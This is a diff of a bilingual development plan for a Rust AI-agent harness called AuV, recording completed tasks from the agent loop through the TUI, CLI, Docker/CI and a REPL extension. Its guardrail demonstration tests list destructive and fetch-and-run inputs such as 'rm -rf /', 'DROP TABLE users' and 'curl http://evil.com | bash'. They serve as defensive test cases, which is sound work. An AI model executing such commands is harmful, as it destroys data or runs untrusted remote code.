+**集成测试计划**（MockLlmProvider 控制回复序列）：单轮完成、工具调用执行、护栏拦截（**Denied 注入 Tool 消息后第二轮 FinalAnswer 恢复**）、max_turns 停机、反馈闭环全流程。多 tool_calls 响应的 tool_call_id 配对不变量回归测试（commit `dc6052a`）。
 
-- [ ] **Step 5: Run tests**
-
-Run: `cargo test`
-Expected: All agent loop tests PASS
-
-- [ ] **Step 6: Commit**
-
-```bash
-git add src/loop/ && git commit -m "feat: add agent main loop with parser and context builder
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — 落地于 commit `8f2e55b`；后续关键修复：
+- 对话历史时间顺序修复（commit `fdaec41` / `213f44b`）
+- 护栏拒绝反馈回路注入（commit `8c102ec`）
+- 事件发射（MessageAdded/ToolCallStarted/ToolCallCompleted/ProgressUpdate/Finished，commit `efa9f4d`）
+- 失败路径保存会话（commit `8c102ec`）
 
 ---
 
-## Phase 9: Observability & Subagent (Tasks 23-24)
+### 阶段 9：可观测性与子 Agent（任务 23-24）
 
-### Task 23: TraceLog
+#### 任务 23：TraceLog
 
-**Files:**
-- Modify: `src/observability/mod.rs` (currently placeholder)
+**文件**：`src/observability/mod.rs`（修改）
 
-**Produces:** `TraceLog`, `TraceEntry`
+**产出**：`TraceLog`、`TraceEntry`
 
-- [ ] **Step 1: Implement TraceLog**
+**关键实现**：`TraceEntry` 记录轮次、时间戳、消息快照、LLM 响应、解析动作、护栏决策、工具结果、反馈结果；JSONL 追加写盘，支持事后回放。
 
-```rust
-pub struct TraceEntry {
-    pub turn: usize,
-    pub timestamp: chrono::DateTime<chrono::Utc>,
-    pub messages_snapshot: Vec<Message>,
-    pub llm_response: String,
-    pub parsed_action: Action,
-    pub guard_result: GuardResult,
-    pub tool_result: Option<ToolResult>,
-    pub feedback_results: Vec<FeedbackResult>,
-}
+**测试计划**：JSONL 写入、回放迭代。
 
-pub struct TraceLog {
-    entries: Vec<TraceEntry>,
-    output: PathBuf,
-}
-
-impl TraceLog {
-    pub fn new(output: PathBuf) -> Self { ... }
-    pub fn record(&mut self, entry: TraceEntry) {
-        self.entries.push(entry);
-        // Append JSONL to file
-    }
-    pub fn replay(&self) -> impl Iterator<Item = &TraceEntry> {
-        self.entries.iter()
-    }
-}
-```
-
-- [ ] **Step 2: Write tests**
-
-- Test: `test_trace_log_writes_jsonl`
-- Test: `test_trace_log_replay`
-
-- [ ] **Step 3: Run tests and commit**
-
-Run: `cargo test` → PASS
-
-```bash
-git add src/observability/ && git commit -m "feat: add trace log for observability
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `5744502`（feat: add trace log for observability）
 
 ---
 
-### Task 24: SubagentSpawner
+#### 任务 24：SubagentSpawner
 
-**Files:**
-- Modify: `src/subagent/mod.rs` (currently placeholder)
+**文件**：`src/subagent/mod.rs`（修改）
 
-**Produces:** `SubagentSpawner`, `IsolationMode`, `SubagentResult`
+**产出**：`SubagentSpawner`、`IsolationMode`、`SubagentResult`
 
-- [ ] **Step 1: Implement SubagentSpawner**
+**关键实现**：递归调用 `agent_loop`，子 agent 在独立上下文运行、只返回摘要；`IsolationMode`（SameProcess / Worktree）；防护：递归深度上限（默认 3）+ 总 agent 数上限（默认 10，`AtomicUsize` 计数）。
 
-```rust
-pub enum IsolationMode { SameProcess, Worktree }
+**测试计划**：摘要返回、深度上限、总数上限。
 
-pub struct SubagentResult {
-    pub summary: String,
-    pub success: bool,
-}
-
-pub struct SubagentSpawner {
-    max_depth: usize,
-    max_total_agents: usize,
-    active_count: Arc<AtomicUsize>,
-}
-
-impl SubagentSpawner {
-    pub async fn spawn(
-        &self,
-        task: &str,
-        depth: usize,
-        isolation: IsolationMode,
-    ) -> Result<SubagentResult, HarnessError> {
-        if depth >= self.max_depth {
-            return Err(HarnessError::RecursionDepthExceeded);
-        }
-        if self.active_count.load(Ordering::SeqCst) >= self.max_total_agents {
-            return Err(HarnessError::SubagentLimitReached);
-        }
-        self.active_count.fetch_add(1, Ordering::SeqCst);
-        // Run agent_loop in isolated context
-        // Return only summary
-        self.active_count.fetch_sub(1, Ordering::SeqCst);
-        // ...
-    }
-}
-```
-
-- [ ] **Step 2: Write tests**
-
-- Test: `test_subagent_returns_summary`
-- Test: `test_subagent_depth_limit`
-- Test: `test_subagent_total_limit`
-
-- [ ] **Step 3: Run tests and commit**
-
-Run: `cargo test` → PASS
-
-```bash
-git add src/subagent/ && git commit -m "feat: add subagent spawner with depth and count limits
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `7db8c06`（feat: add subagent spawner with depth and count limits）
 
 ---
 
-## Phase 10: Credentials (Task 25)
+### 阶段 10：凭据管理（任务 25）
 
-### Task 25: CredentialManager with keyring and env backends
+#### 任务 25：CredentialManager 与 keyring/env 后端
 
-**Files:**
-- Modify: `src/credentials/mod.rs` (currently placeholder)
-- Create: `src/credentials/keyring.rs`
-- Create: `src/credentials/env.rs`
+**文件**：`src/credentials/mod.rs`（修改）、`src/credentials/keyring.rs`、`src/credentials/env.rs`（新建）
 
-**Produces:** `CredentialBackend` trait, `KeyringCredentialBackend`, `EnvCredentialBackend`, `CredentialManager`
+**产出**：`CredentialBackend` trait、`KeyringCredentialBackend`、`EnvCredentialBackend`、`CredentialManager`
 
-- [ ] **Step 1: Implement CredentialBackend trait**
+**关键实现**：
 
 ```rust
 #[async_trait]
@@ -1585,481 +645,210 @@ pub trait CredentialBackend: Send + Sync {
 }
 ```
 
-- [ ] **Step 2: Implement EnvCredentialBackend**
+**测试计划**：env 后端读写删、key 状态不回显明文。
 
-Reads/writes to `.env` file. Documented as "plaintext risk, development only".
-
-- [ ] **Step 3: Implement KeyringCredentialBackend**
-
-Uses `keyring` crate. Handles Linux/macOS/Windows. Falls back to encrypted file if keyring unavailable.
-
-- [ ] **Step 4: Implement CredentialManager**
-
-```rust
-pub struct CredentialManager {
-    backend: Box<dyn CredentialBackend>,
-}
-
-impl CredentialManager {
-    pub fn key_status(&self) -> Result<String, HarnessError> {
-        // List keys, show "configured" not plaintext
-    }
-    pub fn key_set(&self) -> Result<(), HarnessError> {
-        // Interactive: rpassword::prompt_password("Enter API key: ")
-        // Store via backend
-    }
-    pub fn key_clear(&self, key: &str) -> Result<(), HarnessError> { ... }
-}
-```
-
-- [ ] **Step 5: Write tests**
-
-- Test: `test_env_backend_set_and_get`
-- Test: `test_env_backend_delete`
-- Test: `test_key_status_does_not_reveal_plaintext`
-
-- [ ] **Step 6: Run tests and commit**
-
-Run: `cargo test` → PASS
-
-```bash
-git add src/credentials/ && git commit -m "feat: add credential management with keyring and env backends
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — 落地于 commit `8f2e55b`。**与计划的偏差**（见 §7 修订记录）：交付版本以两级配置文件 `[llm] api_key` 为主方案（`~/.AuV/config.toml` / `./.AuV/config.toml`，均在 `.gitignore` 中），环境变量备选，keyring 后端保留未启用。
 
 ---
 
-## Phase 11: TUI (Tasks 26-28)
+### 阶段 11：TUI（任务 26-28）
 
-### Task 26: TUI app state and event loop
+#### 任务 26：TUI 应用状态与事件循环
 
-**Files:**
-- Modify: `src/tui/mod.rs` (currently placeholder)
-- Create: `src/tui/app.rs`
+**文件**：`src/tui/mod.rs`（修改）、`src/tui/app.rs`（新建）
 
-**Produces:** `App`, `AppState`, TUI event loop
+**产出**：`App`、`AppState`、TUI 事件循环
 
-- [ ] **Step 1: Implement App state**
+**关键实现**：`AppState` 持有消息列表、当前工具、工具结果、审批请求、状态信息（轮次/token/风险等级/模型）；事件循环用 `try_recv` 轮询 + `event::poll` 输入 + 持续重绘。**agent 完成后 TUI 不自动退出**（channel 断开不是退出信号），用户读完结果按 `q`/`Esc`/`Ctrl+C` 退出（修复"一闪而过"，commit `efa9f4d`）。
 
-In `src/tui/app.rs`:
-```rust
-pub struct AppState {
-    pub messages: Vec<Message>,
-    pub current_tool: Option<String>,
-    pub tool_results: Vec<ToolResult>,
-    pub guard_requests: Vec<ApprovalRequest>,
-    pub status: StatusInfo,
-    pub running: bool,
-}
+**测试计划**：编译 + 既有测试。
 
-pub struct StatusInfo {
-    pub turn: usize,
-    pub tokens_used: u32,
-    pub risk_level: String,
-    pub model: String,
-}
-```
-
-- [ ] **Step 2: Implement TUI event loop**
-
-In `src/tui/mod.rs`:
-```rust
-pub async fn run_tui(agent: AgentLoop, task: String) -> Result<(), HarnessError> {
-    // 1. Initialize terminal with crossterm
-    // 2. Create ratatui App
-    // 3. Spawn agent loop in background task
-    // 4. Main event loop: draw panels, handle input
-    // 5. On exit: restore terminal
-}
-
-pub fn run_cli(agent: AgentLoop, task: String) -> Result<(), HarnessError> {
-    // Fallback: plain text mode for non-TTY environments
-}
-```
-
-- [ ] **Step 3: Run tests and commit**
-
-Run: `cargo test` → PASS
-
-```bash
-git add src/tui/ && git commit -m "feat: add TUI app state and event loop
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — 落地于 commit `ff8e33a`（feat: add TUI app state and event loop）
 
 ---
 
-### Task 27: TUI panels (conversation, tools, guardrails, status)
+#### 任务 27：TUI 面板（对话、工具、护栏、状态）
 
-**Files:**
-- Create: `src/tui/panels/mod.rs`
-- Create: `src/tui/panels/conversation.rs`
-- Create: `src/tui/panels/tools.rs`
-- Create: `src/tui/panels/guardrails.rs`
-- Create: `src/tui/panels/status.rs`
+**文件**：`src/tui/panels/mod.rs`、`conversation.rs`、`tools.rs`、`guardrails.rs`、`status.rs`（新建）
 
-**Produces:** Four panel renderers
+**产出**：四个面板渲染器
 
-- [ ] **Step 1: Implement conversation panel**
+**关键实现**：对话面板角色配色自动滚动到底；工具面板显示当前调用与最近结果（含具体命令 detail）；护栏面板高亮待审批请求、y/n 操作提示置顶（黄底黑字加粗，请求多时不被裁掉）；状态栏单行显示轮次/token/模型/风险等级（24 位真彩色，主题无关可读；去边框修复"内容高度归零不可见"）。
 
-Renders message list with role-based colors (User=cyan, Assistant=green, System=yellow, Tool=gray). Auto-scrolls to latest message.
+**测试计划**：渲染测试使用真实布局尺寸（状态栏 1 行高）防止掩盖问题。
 
-- [ ] **Step 2: Implement tools panel**
-
-Shows current tool call and recent tool results. Displays tool name, parameters, and result summary.
-
-- [ ] **Step 3: Implement guardrails panel**
-
-Shows pending approval requests with risk details. Highlights High/Critical risk. Waits for y/n input.
-
-- [ ] **Step 4: Implement status bar**
-
-Shows turn count, token usage, model, risk level on a single line at the bottom. Green for normal, yellow for Medium risk, red for High.
-
-- [ ] **Step 5: Run tests and commit**
-
-Run: `cargo test` → PASS
-
-```bash
-git add src/tui/panels/ && git commit -m "feat: add TUI panels for conversation, tools, guardrails, status
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — 落地于 commit `8f2e55b`；面板修复 commit `dc6052a`（y/n 提示置顶、中文化标签）；真彩色 commit `efa9f4d`
 
 ---
 
-### Task 28: TUI layout and terminal setup
+#### 任务 28：TUI 布局与终端设置
 
-**Files:**
-- Modify: `src/tui/mod.rs`
+**文件**：`src/tui/mod.rs`（修改）
 
-**Produces:** Complete TUI with layout
+**产出**：完整布局 TUI
 
-- [ ] **Step 1: Implement layout**
+**关键实现**：ratatui Layout——左侧 70% 对话面板，右侧 30% 上下分割（工具 + 护栏），底部 1 行状态栏。按键：`q`/`Ctrl+C` 退出、`y`/`n` 审批决定（经决定通道传回审批门，commit `efa9f4d`）、`Tab` 焦点切换。agent 循环在独立 tokio 任务中运行，经 mpsc 通道向 TUI 发事件。
 
-Use ratatui `Layout` with:
-- 70% conversation panel (left)
-- 30% split (right): top for tools, bottom for guardrails
-- Status bar at bottom (1 line)
+**测试计划**：编译 + 既有测试。
 
-- [ ] **Step 2: Implement input handling**
-
-Key bindings:
-- `q` or `Ctrl+C` → quit
-- `y` / `n` → approve/deny guardrail request
-- `Enter` → confirm
-- `Tab` → switch focus between panels
-
-- [ ] **Step 3: Integrate with agent loop**
-
-Agent loop runs in a separate tokio task, sends updates via `tokio::sync::mpsc` channel to TUI. TUI renders updates as they arrive.
-
-- [ ] **Step 4: Run tests and commit**
-
-Run: `cargo test` → PASS
-
-```bash
-git add src/tui/ && git commit -m "feat: add TUI layout, input handling, and agent integration
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — 落地于 commit `8f2e55b`
 
 ---
 
-## Phase 12: CLI Entry Point (Task 29)
+### 阶段 12：CLI 入口（任务 29）
 
-### Task 29: CLI with clap
+#### 任务 29：clap CLI
 
-**Files:**
-- Modify: `src/main.rs`
+**文件**：`src/main.rs`（修改）
 
-**Produces:** Complete CLI with `run`, `init`, `key` subcommands
+**产出**：`auv`（无子命令进入 REPL）、`auv run "task"`、`auv run --no-tui`、`auv init`、`auv --resume`、`--approval <档位>`、`--config <路径>`
 
-- [ ] **Step 1: Implement CLI structure**
+**关键实现**：
 
 ```rust
-use clap::{Parser, Subcommand};
-
 #[derive(Parser)]
-#[command(name = "harness", version = "0.1.0")]
 struct Cli {
     #[command(subcommand)]
-    command: Commands,
+    command: Option<Commands>,   // None → 进入 REPL
+    // --resume、--approval 为全局参数
 }
 
 #[derive(Subcommand)]
 enum Commands {
-    /// Run the agent with a task
-    Run {
-        task: String,
-        #[arg(short, long)]
-        config: Option<PathBuf>,
-        #[arg(long)]
-        no_tui: bool,
-    },
-    /// Initialize harness configuration
+    Run { task: String, #[arg(long)] no_tui: bool },
     Init,
-    /// Manage API keys
-    Key {
-        #[command(subcommand)]
-        action: KeyAction,
-    },
-}
-
-#[derive(Subcommand)]
-enum KeyAction {
-    Status,
-    Set,
-    Update,
-    Clear,
+    Key { #[command(subcommand)] action: KeyAction },
 }
 ```
 
-- [ ] **Step 2: Implement command handlers**
+`main()` 装配：分层配置加载（全局 + 项目合并，`--config` 单文件）→ 角色说明叠加 → tracing 初始化（默认 warn、写 stderr、不污染 REPL 输出）→ 按模式分发（REPL / TUI / 纯文本）。
 
-- `run`: load config, set up credentials, build agent, launch TUI or CLI mode
-- `init`: interactive setup wizard (create config.toml, set up key, create .memory dir)
-- `key status`: show which keys are configured (no plaintext)
-- `key set`: interactive prompt for API key
-- `key clear`: remove stored key
+**测试计划**：CLI 解析测试（无子命令进 REPL、`--resume`、`--approval` 英文主值 + 中文别名）、既有测试不回归。
 
-- [ ] **Step 3: Wire everything together**
-
-```rust
-#[tokio::main]
-async fn main() -> Result<(), HarnessError> {
-    tracing_subscriber::init();
-    let cli = Cli::parse();
-    match cli.command {
-        Commands::Run { task, config, no_tui } => {
-            let config = load_config(config)?;
-            let agent = build_agent(config)?;
-            if no_tui || !atty::is(atty::Stream::Stdout) {
-                run_cli(agent, task).await
-            } else {
-                run_tui(agent, task).await
-            }
-        }
-        Commands::Init => { /* setup wizard */ }
-        Commands::Key { action } => { /* key management */ }
-    }
-}
-```
-
-- [ ] **Step 4: Run tests**
-
-Run: `cargo test`
-Expected: All tests PASS
-
-- [ ] **Step 5: Commit**
-
-```bash
-git add src/main.rs && git commit -m "feat: add CLI with run, init, and key subcommands
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — 落地于 commit `8f2e55b`；REPL 入口 commit `d34516d`；两级配置与品牌化 commit `a30bba0`
 
 ---
 
-## Phase 13: Docker & CI (Tasks 30-31)
+### 阶段 13：Docker 与 CI（任务 30-31）
 
-### Task 30: Dockerfile
+#### 任务 30：Dockerfile
 
-**Files:**
-- Create: `Dockerfile`
-- Create: `.dockerignore`
+**文件**：`Dockerfile`、`.dockerignore`（新建）
 
-- [ ] **Step 1: Write Dockerfile**
+**关键实现**：多阶段构建——`rust:1.85-alpine` 构建 + `alpine:3.21` 运行（含 ca-certificates、git），ENTRYPOINT `auv`。`.dockerignore` 排除 `target/`、`.git/`、数据目录、`.env`、`*.md`。
 
-```dockerfile
-FROM rust:1.85-alpine AS builder
-RUN apk add --no-cache musl-dev pkgconfig openssl-dev
-WORKDIR /app
-COPY . .
-RUN cargo build --release
+**验证**：`docker build -t auv .` 构建成功。
 
-FROM alpine:3.21
-RUN apk add --no-cache ca-certificates git
-COPY --from=builder /app/target/release/harness /usr/local/bin/harness
-ENTRYPOINT ["harness"]
-```
-
-- [ ] **Step 2: Write .dockerignore**
-
-```
-target/
-.git/
-.memory/
-.harness/
-.env
-*.md
-```
-
-- [ ] **Step 3: Verify build**
-
-Run: `docker build -t harness-agent .`
-Expected: Builds successfully
-
-- [ ] **Step 4: Commit**
-
-```bash
-git add Dockerfile .dockerignore && git commit -m "feat: add Dockerfile for container distribution
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `83eadc5`（feat: add Dockerfile and GitHub Actions CI workflow）
 
 ---
 
-### Task 31: GitHub Actions CI
+#### 任务 31：CI 工作流
 
-**Files:**
-- Create: `.github/workflows/ci.yml`
+**文件**：`.github/workflows/ci.yml`（新建）
 
-- [ ] **Step 1: Write CI workflow**
+**关键实现**：`unit-test` job——checkout → rust-toolchain → `cargo test --verbose` → `cargo build --release`。
 
-```yaml
-name: CI
-on: [push, pull_request]
-jobs:
-  unit-test:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: dtolnay/rust-toolchain@stable
-      - run: cargo test --verbose
-      - run: cargo build --release
-```
-
-- [ ] **Step 2: Commit**
-
-```bash
-git add .github/workflows/ci.yml && git commit -m "feat: add GitHub Actions CI workflow
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `83eadc5`。课程要求的 `.gitlab-ci.yml` 由并行工作流另行补齐（本计划任务范围外）。
 
 ---
 
-## Phase 14: Mechanism Demonstrations (Task 32)
+### 阶段 14：机制演示（任务 32）
 
-### Task 32: Mechanism demonstration tests
+#### 任务 32：机制演示测试
 
-**Files:**
-- Create: `tests/mechanism_demo.rs`
+**文件**：`tests/mechanism_demo.rs`（新建）
 
-**Produces:** Three deterministic demonstration tests
+**产出**：三项确定性演示测试（`cargo test --test mechanism_demo`）
 
-- [ ] **Step 1: Demo 1 — Guardrail intercepts dangerous action**
+**演示内容**：
+1. **护栏拦截危险动作**：构造 `bash: rm -rf /` 工具调用，断言 `GuardResult::Denied` 并打印拦截原因
+2. **反馈闭环驱动自我修正**：MockLlmProvider 预设序列（写入有缺陷代码 → 看到反馈后修复 → FinalAnswer），断言反馈注入消息、LLM 下一步动作随之改变
+3. **护栏管线全流程（重点维度）**：四层独立验证（静态规则 Escalate、风险评估 High、白名单自动批准、沙箱拒绝越界写）+ 全管线组合（`curl | bash` → 升级 → 高风险 → 需审批），打印各层决策轨迹
 
-```rust
-#[tokio::test]
-async fn demo_guardrail_intercepts_dangerous_action() {
-    // 1. Set up GuardrailPipeline with built-in rules
-    // 2. Create Action::ToolCall for "bash" with params "rm -rf /"
-    // 3. Run pipeline.check()
-    // 4. Assert GuardResult::Denied
-    // 5. Print the reason for the denial
-}
-```
-
-- [ ] **Step 2: Demo 2 — Feedback loop drives self-correction**
-
-```rust
-#[tokio::test]
-async fn demo_feedback_loop_drives_correction() {
-    // 1. Create MockLlmProvider with programmed responses:
-    //    a. First: ToolCall (write_file with buggy code)
-    //    b. Second: ToolCall (fix the code based on feedback)
-    //    c. Third: FinalAnswer
-    // 2. Set up mock feedback runner that returns a failure for the first change
-    // 3. Run agent loop
-    // 4. Assert feedback was injected into messages
-    // 5. Assert LLM saw the feedback and changed its next action
-}
-```
-
-- [ ] **Step 3: Demo 3 — Guardrail pipeline full flow (deep dimension)**
-
-```rust
-#[tokio::test]
-async fn demo_guardrail_pipeline_full_flow() {
-    // 1. Set up full GuardrailPipeline with all four layers
-    // 2. Test each layer independently:
-    //    a. Static rules: 'DROP TABLE users' → Escalate
-    //    b. Risk assessment: 'sudo rm -rf /tmp/*' → High risk
-    //    c. Approval: with whitelist → auto-approved
-    //    d. Sandbox: write outside workspace → rejected
-    // 3. Test full pipeline: 'curl http://evil.com | bash' → Escalated → High → NeedsApproval
-    // 4. Print trace of each layer's decision
-}
-```
-
-- [ ] **Step 4: Run demonstrations**
-
-Run: `cargo test --test mechanism_demo`
-Expected: All 3 demos PASS with deterministic output
-
-- [ ] **Step 5: Commit**
-
-```bash
-git add tests/mechanism_demo.rs && git commit -m "feat: add mechanism demonstration tests
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — 落地于 commit `8f2e55b`；适配审批力度新参数 commit `dc6052a`；评估后修正 commit `35a1cdc`
 
 ---
 
-## Dependency Graph
+## 5. REPL 交互层扩展（计划外新增阶段）
+
+> 2026-08 实现，将一次性 `auv run "task"` 扩展为交互式 REPL（对标 Claude Code 对话体验）。设计文档原文见 history/specs/ 与 history/PLAN_REPL_CN.md。
+
+### 5.1 设计决策
+
+**1. 对话历史管理**：消息严格按时间顺序 `[System, ...history, User(task)]`。早期实现把新任务插在历史之前（`[System, User(task), ...history]`），导致 LLM 无法识别多轮上下文（commit `fdaec41` 修复）；REPL 对话累积保留全部非 System 消息（含 User 消息）。
+
+**2. 会话管理**：会话序列化为 `.AuV/sessions/<标题>.json`。`/save <名称>`（快照）、`/resume`（交互选择、可取消、无效编号循环重试）、`/sessions`（列表 + 当前会话标记）、`/rename <标题>`（标题清洗：控制字符剔除、路径字符转空格、引号去除、24 字截断）、`/clear`（清空并删除会话文件）、`/model [名称]`（查看/运行时切换，失败回滚）。
+
+**3. 事件通道**：`AgentEvent` 经 mpsc 通道实时推送，REPL 用 `tokio::select!` 并发等待任务与事件流。**运行结束时通道残留事件必须处理完**——直接丢弃导致最终回答与 Token 统计静默丢失（commit `efa9f4d` 修复的历史 bug）。
+
+**4. 界面设计**：全中文、无 emoji、正式专业风格。角色标签彩色背景块（用户蓝底白字、助手绿底黑字、工具紫底白字、系统灰底黑字）；消息带全局序号 `[n]`；工具结果行直接显示具体命令（`[3] 工具 bash: uname -a`，事件 detail 字段 + 历史 tool_call_id 反查，实时/历史/view 五处渲染一致）；输入区上方常驻状态行（模型/累计 Token/上下文剩余）；清屏重绘统一走 `\x1b[2J\x1b[H\x1b[3J`（`3J` 同时清滚动缓冲区，根治向上滚动出现重复历史）。
+
+**5. 输入编辑器**：rustyline 15——`↑`/`↓` 历史导航（持久化 `.AuV/repl_history.txt`）、行内光标编辑、`Ctrl+C`/`Ctrl+D` 退出。
+
+**6. 自动保存（模型起名）**：首条任务结束后模型生成 ≤12 字标题（单轮调用 + 标题 system prompt，失败回退 `autosave`），保存 `<标题>.json`；`auv --resume` 启动恢复最近修改会话（按 mtime）；`/clear` 删除当前会话文件；`/save` 保留命名快照。
+
+**7. 护栏审批 REPL 事件模式**：AgentLoop 只发 `GuardrailApprovalNeeded` 事件，REPL 打印审批块（独立行、`(y/n): ` 提示独立行）、读 y/n、决定经 `decision_tx` 发回；审批结束全屏重绘清除审批块。**不使用 DECSC/DECRC 光标舞步**（滚动/并发输出下不可靠，与 rustyline 刷新模型互斥——回归测试禁止该转义序列）。
+
+### 5.2 实现清单（全部完成）
+
+- CLI 无子命令进入 REPL；多轮对话历史（时间顺序正确）
+- 实时事件渲染（助手消息块、工具结果行、护栏审批块、全局序号）
+- 会话管理全命令（/save /resume /sessions /rename /clear /model /history /view /cls /approval /skills /help /exit）
+- 自动保存（模型起名）+ `--resume` 恢复最近会话
+- 历史完整展示（用户/助手消息不截断，工具结果限 12 行/600 字符，`/view <编号>` 看全文）
+- 中文界面全量（横幅、帮助、状态、角色标签、护栏审批、评估原因、风险等级、沙箱违规）
+- 审批期间 Ctrl+C 视为拒绝；行结束 `\n`/`\r` 容错；审批竞态残留补重绘
+- 多 tool_calls 配对（tool_call_id 不变量）、DeepSeek `reasoning_content` 回传
+- 审批力度四档（CLI/配置/REPL 三途径）、英文主值 + 中文别名
+- 上下文窗口按模型家族识别（gpt-4/5/o 与 claude 128k、deepseek 64k、llama/qwen/glm 32k）
+- 项目更名 AuV（二进制/横幅/默认提示词）；两级配置 + AuV.md 角色说明
+- 数据目录统一收纳 `.AuV/`（sessions/repl_history/audit.jsonl/memory，commit `227e1d5`）
+
+**完成状态**：✓ 已完成 — 对应 commit `d34516d` 起至 `227e1d5` 的连续迭代（详见 AGENT_LOG.md 时间线）
+
+---
+
+## 6. 依赖关系图
 
 ```
-Phase 1 (Tasks 1-3): Foundation — no dependencies
+阶段 1（任务 1-3）：基础——无依赖
     ↓
-Phase 2 (Tasks 4-5): LLM Layer — depends on Phase 1
-Phase 3 (Task 6): Config — depends on Phase 1
-    ↓ (parallel)
-Phase 4 (Tasks 7-11): Tools — depends on Phases 1, 2
-Phase 5 (Tasks 12-18): Guardrails — depends on Phase 1 (deep focus)
-    ↓ (parallel)
-Phase 6 (Tasks 19-20): Feedback — depends on Phase 1
-Phase 7 (Task 21): Memory — depends on Phase 1
+阶段 2（任务 4-5）：LLM 层——依赖阶段 1
+阶段 3（任务 6）：配置——依赖阶段 1
+    ↓（并行）
+阶段 4（任务 7-11）：工具——依赖阶段 1、2
+阶段 5（任务 12-18）：护栏——依赖阶段 1（重点维度）
+    ↓（并行）
+阶段 6（任务 19-20）：反馈——依赖阶段 1
+阶段 7（任务 21）：记忆——依赖阶段 1
     ↓
-Phase 8 (Task 22): Agent Loop — depends on ALL above
+阶段 8（任务 22）：Agent 主循环——依赖以上全部
     ↓
-Phase 9 (Tasks 23-24): Observability + Subagent — depends on Phase 8
-Phase 10 (Task 25): Credentials — independent (can be done anytime)
-Phase 11 (Tasks 26-28): TUI — depends on Phase 8
-Phase 12 (Task 29): CLI — depends on ALL above
+阶段 9（任务 23-24）：可观测性 + 子 Agent——依赖阶段 8
+阶段 10（任务 25）：凭据——独立（任意时间可做）
+阶段 11（任务 26-28）：TUI——依赖阶段 8
+阶段 12（任务 29）：CLI——依赖以上全部
     ↓
-Phase 13 (Tasks 30-31): Docker + CI — depends on Phase 12
-Phase 14 (Task 32): Mechanism Demos — depends on Phase 8, 5 (guardrails), 6 (feedback)
+阶段 13（任务 30-31）：Docker + CI——依赖阶段 12
+阶段 14（任务 32）：机制演示——依赖阶段 8、5（护栏）、6（反馈）
+阶段 15：REPL 扩展——依赖阶段 8、12（计划外新增）
 ```
 
-## Parallel Work Opportunities
-
-These phases can run in parallel worktrees:
-- Phase 2 (LLM) + Phase 3 (Config) + Phase 5 (Guardrails) can all start after Phase 1
-- Phase 4 (Tools) + Phase 6 (Feedback) + Phase 7 (Memory) + Phase 10 (Credentials) can run in parallel
-- Phase 9 (Observability) + Phase 11 (TUI) can run in parallel after Phase 8
+**并行工作机会**：阶段 2 + 3 + 5 可在阶段 1 后并行；阶段 4 + 6 + 7 + 10 可并行；阶段 9 + 11 在阶段 8 后并行。
 
 ---
 
-## Plan Summary
+## 7. 实施过程中的计划修订
 
-| Phase | Tasks | Description | Est. Time |
-|-------|-------|-------------|-----------|
-| 1 | 1-3 | Scaffolding + Core Types | 30 min |
-| 2 | 4-5 | LLM Abstraction | 30 min |
-| 3 | 6 | Configuration | 20 min |
-| 4 | 7-11 | Tool System | 45 min |
-| 5 | 12-18 | **Guardrails (deep focus)** | 90 min |
-| 6 | 19-20 | Feedback Loop | 30 min |
-| 7 | 21 | Memory | 20 min |
-| 8 | 22 | Agent Main Loop | 30 min |
-| 9 | 23-24 | Observability + Subagent | 20 min |
-| 10 | 25 | Credentials | 20 min |
-| 11 | 26-28 | TUI | 45 min |
-| 12 | 29 | CLI Entry Point | 15 min |
-| 13 | 30-31 | Docker + CI | 15 min |
-| 14 | 32 | Mechanism Demos | 20 min |
-| **Total** | **32 tasks** | | **~7 hours** |
+| 修订 | 内容 | 依据 |
+|------|------|------|
+| 模块布局冲突 | 原计划 Task 1 为所有模块创建 `src/<module>/mod.rs`，Task 2/3 又要求修改 `src/types.rs`/`src/error.rs`——同一模块不能同时有两种表示。修订为混合布局：叶子模块用 `src/<module>.rs`，含子模块的用 `src/<module>/mod.rs`（用户确认） | SPEC_PROCESS.md 冷启动验证 |
+| Cargo 目标声明 | 原 Cargo 示例缺 `[lib]`/`[[bin]]` 声明，补充后产物名称与计划一致 | SPEC_PROCESS.md 冷启动验证 |
+| 护栏管线顺序 | 原计划「审批 → 沙箱」，实现中发现审批后仍被沙箱拦造成"假批准"，修订为「沙箱硬校验先于审批」 | commit `8c102ec`（真实会话审计日志定位） |
+| 凭据主方案 | 原计划 OS 钥匙串为主，实现中发现无桌面环境可用性差，交付版改为两级配置文件为主 + 环境变量备选，keyring 保留预留 | SPEC.md §8.1 差异说明 |
+| 二进制更名 | `harness` → `auv`（项目更名 AuV harness agent），lib/包名与内部类型名保持 | commit `a30bba0` |
+| 数据目录 | `.harness/`、`.memory/` 统一收纳到 `.AuV/`（一次性手动迁移） | commit `227e1d5` |
+| 主循环 API | 原计划 `AgentLoop::run()` 一次性运行，实现为 `run_with_history(task, history)` 支持跨轮对话 + UI 事件发射 | REPL 扩展阶段 |
+| L3/L4 编号 | 沙箱与审批的层号随管线顺序互换（本文件按最终顺序叙述） | commit `8c102ec` |
+| 新增阶段 15 | REPL 交互层为计划外新增阶段（用户需求驱动），包含会话管理、事件系统、审批交互、自动保存等 | §5 |
